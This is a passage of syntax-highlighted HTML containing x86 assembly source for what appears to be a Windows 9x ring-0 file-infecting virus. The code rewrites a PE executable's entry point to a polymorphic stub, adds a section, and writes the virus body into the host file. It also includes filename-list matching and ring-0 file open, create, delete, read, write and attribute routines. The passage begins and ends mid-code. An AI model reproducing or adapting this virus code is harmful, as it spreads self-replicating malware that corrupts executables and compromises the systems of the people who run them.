                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_entrypoint</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">pe.pe_numofobjects</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe1.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">

</span><span class="sc5">__22</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__11</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">__33</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">

</span><span class="sc5">__33</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__22</span><span class="sc0">
</span><span class="sc5">__11</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__method_2_exit</span><span class="sc0">

</span><span class="sc5">naebka_4</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">naebka_5</span><span class="sc0">
</span><span class="sc5">naebka_2</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">naebka_3</span><span class="sc0">

</span><span class="sc5">is_in_list</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">__next</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">short_name_len</span><span class="sc4">+</span><span class="sc5">short_ext_len</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'?'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__1</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__4</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__4</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc0">

</span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__3</span><span class="sc0">             </span><span class="sc1">; nz</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__2</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; zr</span><span class="sc0">

</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__found</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">short_name_len</span><span class="sc4">+</span><span class="sc5">short_ext_len</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__next</span><span class="sc0">

                        </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__found</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">_strlen</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">access_ebx</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">access_edx</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">access_ecx</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">access_eax</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">)</span><span class="sc0">

                        </span><span class="sc1">; i: edx=filename</span><span class="sc0">
                        </span><span class="sc1">; o: cf, eax=handle</span><span class="sc0">
</span><span class="sc5">fopen</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2022h</span><span class="sc0">       </span><span class="sc1">; no int 24, denywrite, r/w</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">          </span><span class="sc1">; archive (unused here)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; fail | open</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: edx=filename</span><span class="sc0">
                        </span><span class="sc1">; o: cf, eax=handle</span><span class="sc0">
</span><span class="sc5">fcreate</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2022h</span><span class="sc0">       </span><span class="sc1">; no int 24, denywrite, r/w</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">          </span><span class="sc1">; archive</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">         </span><span class="sc1">; create | open/replace</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: edx=filename</span><span class="sc0">
</span><span class="sc5">fdelete</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_DELETEFILE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2027h</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">


                        </span><span class="sc1">; i: ebx=handle</span><span class="sc0">
</span><span class="sc5">fclose</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: ebx=handle</span><span class="sc0">
                        </span><span class="sc1">;    edx=buffer</span><span class="sc0">
                        </span><span class="sc1">;    ecx=size</span><span class="sc0">
                        </span><span class="sc1">;    esi=file pos</span><span class="sc0">
                        </span><span class="sc1">; o: ecx=bytes read</span><span class="sc0">
</span><span class="sc5">fread</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: ebx=handle</span><span class="sc0">
                        </span><span class="sc1">;    edx=buffer</span><span class="sc0">
                        </span><span class="sc1">;    ecx=size</span><span class="sc0">
                        </span><span class="sc1">;    esi=file pos</span><span class="sc0">
                        </span><span class="sc1">; o: ecx=bytes written</span><span class="sc0">
</span><span class="sc5">fwrite</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: ebx=handle</span><span class="sc0">
                        </span><span class="sc1">; o: eax=file size</span><span class="sc0">
</span><span class="sc5">fgetsize</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: edx=filename</span><span class="sc0">
                        </span><span class="sc1">; o: ecx=fileattr</span><span class="sc0">
</span><span class="sc1">;fgetattr:               pusha</span><span class="sc0">
</span><span class="sc1">;                        mov     eax, R0_FILEATTRIBUTES + GET_ATTRIBUTES</span><span class="sc0">
</span><span class="sc1">;                        mov     esi, edx</span><span class="sc0">
</span><span class="sc1">;                        VxDcall IFSMGR_Ring0_FileIO</span><span class="sc0">
</span><span class="sc1">;                        mov     [esp].access_ecx, ecx</span><span class="sc0">
</span><span class="sc1">;                        popa</span><span class="sc0">
</span><span class="sc1">;                        ret</span><span class="sc0">

                        </span><span class="sc1">; i: edx=filename</span><span class="sc0">
                        </span><span class="sc1">;    ecx=fileattr</span><span class="sc0">
</span><span class="sc5">fsetattr</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: edx=filemask</span><span class="sc0">
                        </span><span class="sc1">;    ecx=attribs</span><span class="sc0">
                        </span><span class="sc1">;    esi=find structure</span><span class="sc0">
                        </span><span class="sc1">; o: cf, eax=findhandle</span><span class="sc0">
</span><span class="sc5">ffindfirst</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; i: eax=findhandle</span><span class="sc0">
                        </span><span class="sc1">;    esi=find structure</span><span class="sc0">
                        </span><span class="sc1">; o: cf</span><span class="sc0">
</span><span class="sc1">;ffindnext:              pusha</span><span class="sc0">
</span><span class="sc1">;                        xchg    ebx, eax</span><span class="sc0">
</span><span class="sc1">;                        mov     eax, R0_FINDFIRSTFILE</span><span class="sc0">
</span><span class="sc1">;                        mov     edx, esi</span><span class="sc0">
</span><span class="sc1">;                        VxDcall IFSMGR_Ring0_FileIO</span><span class="sc0">
</span><span class="sc1">;                        mov     [esp].access_eax, eax</span><span class="sc0">
</span><span class="sc1">;                        popa</span><span class="sc0">
</span><span class="sc1">;                        ret</span><span class="sc0">

                        </span><span class="sc1">; i: eax=find handle</span><span class="sc0">
</span><span class="sc5">ffindclose</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR_Ring0_FileIO</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">

</span><span class="sc5">debug_beep_FREQ</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3300</span><span class="sc0">
</span><span class="sc5">debug_beep_DELAY</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">65536</span><span class="sc0">

</span><span class="sc5">debug_beep</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">12345678h</span><span class="sc4">/</span><span class="sc5">debug_beep_FREQ</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">12345678h</span><span class="sc4">/</span><span class="sc5">debug_beep_FREQ</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">debug_beep_DELAY</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

                        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">;rnd_eax_ebx:            push    ebx</span><span class="sc0">
</span><span class="sc1">;                        cmp     eax, ebx</span><span class="sc0">
</span><span class="sc1">;                        jae     __1</span><span class="sc0">
</span><span class="sc1">;                        xchg    ebx, eax</span><span class="sc0">
</span><span class="sc1">;__1:                    sub     eax, ebx</span><span class="sc0">
</span><span class="sc1">;                        inc     eax</span><span class="sc0">
</span><span class="sc1">;                        call    rnd_eax</span><span class="sc0">
</span><span class="sc1">;                        add     eax, ebx</span><span class="sc0">
</span><span class="sc1">;                        pop     ebx</span><span class="sc0">
</span><span class="sc1">;                        ret</span><span class="sc0">

</span><span class="sc5">rnd_eax</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
